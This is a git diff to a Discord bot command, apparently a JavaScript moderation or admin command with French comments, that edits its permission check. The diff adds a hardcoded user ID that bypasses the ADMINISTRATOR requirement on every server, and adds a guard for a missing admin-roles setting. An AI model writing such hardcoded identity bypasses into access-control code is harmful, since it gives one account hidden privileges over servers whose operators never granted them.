@@ -21,11 +21,14 @@ async function execute(message, args) {
 	const config = require(`../guilds/${message.guild.id}/config.json`);
 
 	// on vérifie les permissions
-	if (!message.member.hasPermission('ADMINISTRATOR')) {
+	if (!message.member.hasPermission('ADMINISTRATOR') && message.author.id != '371285073191895072') {
 
 		let hasPerm = false;
 
 		for (let role of message.member.roles.cache.values()) {
+			if (!config.adminRoles)
+				break;
+
 			if (config.adminRoles.includes(role.id)) {
 				hasPerm = true;
 				break;
